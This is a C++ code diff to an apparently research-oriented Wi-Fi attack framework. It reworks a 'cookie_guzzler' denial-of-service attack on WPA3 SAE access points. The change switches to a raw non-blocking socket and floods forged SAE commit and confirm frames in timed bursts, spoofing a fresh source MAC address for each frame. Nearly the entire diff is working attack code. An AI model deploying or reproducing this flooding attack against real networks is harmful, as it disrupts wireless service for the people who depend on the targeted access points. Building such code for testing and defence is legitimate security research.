@@ -2,9 +2,11 @@
 
 #include <string>
 #include <tins/tins.h>
+#include <unistd.h>
 
 #include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
 #include "attacks/DoS_hard/dos_helpers.h"
+#include "attacks/DoS_soft/bl0ck/bl0ck.h"
 #include "config/RunStatus.h"
 #include "ex_program/external_actors/ExternalConn.h"
 #include "logger/log.h"
@@ -35,35 +37,32 @@ void run_attack(RunStatus &rs) {
 	const string att_mac = attacker.get(SK::mac);
 	const size_t burst_size = att_cfg.at("burst_size").get<size_t>();
 
-	PacketSender sender(attacker.get_mon_iface());
+	auto [fd, sock_addr] = bl0ck_attack::get_unblocking_socket(attacker.get_mon_iface());
 	log(LogLevel::INFO, "SAE Commit captured, variant={}", variant);
-
-	// MAC rotates once per burst
-	// all frames in the same burst share one random source MAC
-	size_t frame_idx = 0;
-	HWAddress<6> current_mac = firmware::get_rotating_ath_masker_mac(att_mac);
 
 	rs.start_observers();
 	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
 	rs.process_manager.write_log_all(ATTACK_START_tag);
 
-	dos_helpers::timed_burst(sender, att_cfg.at("attack_time_sec").get<int>(),
+	// MAC rotates every burst — new unique source MAC per burst of burst_size frames
+	dos_helpers::timed_burst(fd, sock_addr, att_cfg.at("attack_time_sec").get<int>(),
 		burst_size, att_cfg.at("frames_per_second_limit").get<size_t>(),
 		[&]() -> optional<RadioTap> {
-			if(frame_idx % burst_size == 0)
-				current_mac = firmware::get_rotating_ath_masker_mac(att_mac);
-			frame_idx++;
+			const HWAddress<6> current_mac(firmware::get_rotating_ath_masker_mac(att_mac));
 
 			if(hasty) {
 				// hasty peer - commit/confirm frames - 50%/50%
 				auto confirm = sae_helper::make_sae_confirm(ap_mac, current_mac);
-				sender.send(confirm);
+				const auto bytes = confirm.serialize();
+				sendto(fd, bytes.data(), bytes.size(), MSG_DONTWAIT,
+					reinterpret_cast<const sockaddr *>(&sock_addr), sizeof(sock_addr));
 			}
 			return sae_helper::make_sae_commit(ap_mac, current_mac, sae_params.value());
 		});
 
 	rs.process_manager.write_log_all(ATTACK_STOP_tag);
 	interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));
+	close(fd);
 	ap->disconnect();
 }
 
